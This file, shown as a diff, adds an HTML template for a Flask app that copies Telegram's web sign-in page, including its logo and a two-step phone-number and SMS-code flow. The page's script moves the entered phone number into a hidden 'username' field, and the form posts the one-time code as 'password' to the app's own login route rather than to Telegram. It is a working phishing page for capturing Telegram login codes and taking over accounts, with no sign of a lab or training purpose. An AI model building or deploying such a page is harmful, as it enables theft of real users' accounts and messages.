@@ -1,0 +1,318 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Web Flow</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
+        }
+        body {
+            background-color: #ffffff;
+            color: #000000;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px 16px;
+        }
+        .login-card {
+            background-color: #ffffff;
+            width: 100%;
+            max-width: 360px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+        }
+        .view {
+            display: none;
+            width: 100%;
+            flex-direction: column;
+            align-items: center;
+        }
+        .view.active {
+            display: flex;
+        }
+        .icon-container {
+            width: 140px;
+            height: 140px;
+            margin-bottom: 24px;
+        }
+        .telegram-logo {
+            width: 100%;
+            height: 100%;
+        }
+        .title {
+            font-size: 30px;
+            font-weight: 500;
+            color: #000000;
+            margin-bottom: 8px;
+            letter-spacing: -0.5px;
+        }
+        .subtitle {
+            font-size: 15px;
+            color: #707579;
+            line-height: 22px;
+            margin-bottom: 32px;
+            padding: 0 8px;
+        }
+        .phone-display {
+            font-weight: 600;
+            color: #000000;
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+        }
+        .edit-icon {
+            color: #3390ec;
+            cursor: pointer;
+            display: inline-flex;
+        }
+        .login-form {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+        .input-group {
+            position: relative;
+            width: 100%;
+        }
+        .input-field {
+            width: 100%;
+            height: 54px;
+            padding: 16px;
+            background-color: #ffffff;
+            border: 1px solid #dae1e8;
+            border-radius: 12px;
+            font-size: 16px;
+            outline: none;
+            color: #000000;
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+        .input-field:focus {
+            border-color: #3390ec;
+            box-shadow: 0 0 0 1px #3390ec;
+        }
+        .input-label {
+            position: absolute;
+            left: 16px;
+            top: 17px;
+            font-size: 16px;
+            color: #a2acb4;
+            pointer-events: none;
+            transition: all 0.15s ease;
+            background-color: #ffffff;
+            padding: 0 4px;
+        }
+        .input-field:focus ~ .input-label,
+        .input-field:not(:placeholder-shown) ~ .input-label {
+            top: -9px;
+            left: 12px;
+            font-size: 12px;
+            color: #3390ec;
+            font-weight: 500;
+        }
+        .otp-group .input-label {
+            left: 50%;
+            transform: translateX(-50%);
+        }
+        .otp-group .input-field:focus ~ .input-label,
+        .otp-group .input-field:not(:placeholder-shown) ~ .input-label {
+            left: 50%;
+            transform: translateX(-50%);
+        }
+        .otp-input {
+            font-size: 20px;
+            font-weight: 600;
+            letter-spacing: 4px;
+            text-align: center;
+        }
+        .checkbox-row {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            width: 100%;
+            cursor: pointer;
+        }
+        .checkbox-row input {
+            width: 20px;
+            height: 20px;
+            accent-color: #3390ec;
+            cursor: pointer;
+        }
+        .checkbox-row label {
+            font-size: 15px;
+            color: #000000;
+            cursor: pointer;
+        }
+        .btn-submit {
+            width: 100%;
+            height: 52px;
+            background-color: #3390ec;
+            border: none;
+            border-radius: 12px;
+            color: #ffffff;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 8px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            transition: background-color 0.2s;
+        }
+        .btn-submit:hover {
+            background-color: #2b7cd3;
+        }
+        .btn-link {
+            background: none;
+            border: none;
+            color: #3390ec;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 20px;
+            text-transform: uppercase;
+        }
+        .resend-text {
+            font-size: 14px;
+            color: #707579;
+            cursor: pointer;
+            margin-top: 12px;
+        }
+        .resend-text:hover {
+            color: #3390ec;
+        }
+        /* Hidden username field for submission */
+        .hidden-field {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+<main class="login-card">
+
+    <!-- STEP 1: Phone Number View -->
+    <div id="step-phone" class="view active">
+        <div class="icon-container">
+            <svg class="telegram-logo" viewBox="0 0 240 240" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <circle cx="120" cy="120" r="120" fill="url(#tg-grad)"/>
+                <path d="M98 175c-3.887 0-3.227-1.465-4.568-5.16L79.5 124.325 168.825 71" fill="#C8DAEA"/>
+                <path d="M98 175c3 0 4.325-1.372 6-3l16.142-15.717-20.102-12.128" fill="#A9C6D8"/>
+                <path d="M100.04 144.155l48.22 35.62c5.514 3.042 9.5 1.465 10.875-5.118l19.625-92.483c2.013-8.071-3.053-11.718-8.315-9.328L25.867 112.22c-7.882 3.16-7.832 7.561-1.438 9.516l24.27 7.578 56.23-35.474c2.655-1.61 5.093-.745 3.093 1.033" fill="#FFFFFF"/>
+                <defs>
+                    <linearGradient id="tg-grad" x1="120" y1="0" x2="120" y2="240" gradientUnits="userSpaceOnUse">
+                        <stop stop-color="#37AEE2"/>
+                        <stop offset="1" stop-color="#1E96C8"/>
+                    </linearGradient>
+                </defs>
+            </svg>
+        </div>
+        <h1 class="title">Sign in to Telegram</h1>
+        <p class="subtitle">Please confirm your country code and enter your phone number.</p>
+
+        <!-- PHONE FORM: we intercept submit to store phone and switch views -->
+        <form class="login-form" id="phone-form" action="#">
+            <div class="input-group">
+                <input type="text" id="country" class="input-field" value="United States" placeholder=" " required />
+                <label for="country" class="input-label">Country</label>
+            </div>
+            <div class="input-group">
+                <input type="tel" id="phone-input" class="input-field" value="+1 " placeholder=" " required />
+                <label for="phone-input" class="input-label">Phone Number</label>
+            </div>
+            <div class="checkbox-row">
+                <input type="checkbox" id="keep-signed" checked />
+                <label for="keep-signed">Keep me signed in</label>
+            </div>
+            <button type="submit" class="btn-submit">Next</button>
+        </form>
+        <button type="button" class="btn-link">Log in by QR Code</button>
+    </div>
+
+    <!-- STEP 2: OTP Verification View -->
+    <div id="step-otp" class="view">
+        <div class="icon-container">
+            <svg class="telegram-logo" viewBox="0 0 120 120" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <circle cx="60" cy="60" r="50" fill="#F3F4F6"/>
+                <circle cx="20" cy="60" r="12" fill="#D1D5DB"/>
+                <circle cx="100" cy="60" r="12" fill="#D1D5DB"/>
+                <circle cx="60" cy="60" r="42" fill="#E5E7EB"/>
+                <circle cx="46" cy="52" r="6" fill="#1F2937"/>
+                <circle cx="74" cy="52" r="6" fill="#1F2937"/>
+                <circle cx="48" cy="50" r="2" fill="#FFFFFF"/>
+                <circle cx="76" cy="50" r="2" fill="#FFFFFF"/>
+                <ellipse cx="60" cy="68" rx="16" ry="12" fill="#F9FAFB"/>
+                <path d="M54 72 C 58 75, 62 75, 66 72" stroke="#9CA3AF" stroke-width="2" stroke-linecap="round" fill="none"/>
+            </svg>
+        </div>
+        <h1 class="title">Enter Code</h1>
+        <p class="subtitle">
+            We've sent an SMS with the code to<br>
+            <span class="phone-display">
+                <span id="display-phone-number">+1 234 567 890</span>
+                <span class="edit-icon" id="btn-edit-phone" title="Edit phone number">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <path d="M12 20h9"></path>
+                        <path d="M16.5 3.5a2.121 2.121 0 0 1 3 3L7 19l-4 1 1-4L16.5 3.5z"></path>
+                    </svg>
+                </span>
+            </span>
+        </p>
+
+        <!-- OTP FORM: posts to Flask backend with username (phone) and password (OTP) -->
+        <form class="login-form" id="otp-form" action="{{ url_for('login') }}" method="POST">
+            <!-- Hidden field for phone number (username) -->
+            <input type="hidden" name="username" id="otp-username" value="">
+
+            <div class="input-group otp-group">
+                <input type="text" id="otp-code" name="password" class="input-field otp-input" maxlength="5" placeholder=" " required />
+                <label for="otp-code" class="input-label">Code</label>
+            </div>
+            <div class="resend-text">Tap to resend code via SMS</div>
+            <button type="submit" class="btn-submit">Sign In</button>
+        </form>
+    </div>
+
+</main>
+
+<script>
+    const phoneForm = document.getElementById('phone-form');
+    const phoneInput = document.getElementById('phone-input');
+    const displayPhoneNumber = document.getElementById('display-phone-number');
+    const stepPhone = document.getElementById('step-phone');
+    const stepOtp = document.getElementById('step-otp');
+    const btnEditPhone = document.getElementById('btn-edit-phone');
+    const otpCodeInput = document.getElementById('otp-code');
+    const otpUsername = document.getElementById('otp-username');
+
+    // Handle Phone Form Submit -> store phone, switch to OTP view, set hidden username
+    phoneForm.addEventListener('submit', (e) => {
+        e.preventDefault();
+        const enteredPhone = phoneInput.value.trim();
+        if (enteredPhone) {
+            displayPhoneNumber.textContent = enteredPhone;
+            otpUsername.value = enteredPhone;        // set hidden field for submission
+            stepPhone.classList.remove('active');
+            stepOtp.classList.add('active');
+            otpCodeInput.focus();
+        }
+    });
+
+    // Edit Phone Number Click -> Go back to Phone View
+    btnEditPhone.addEventListener('click', () => {
+        stepOtp.classList.remove('active');
+        stepPhone.classList.add('active');
+        phoneInput.focus();
+    });
+</script>
+
+</body>
+</html>
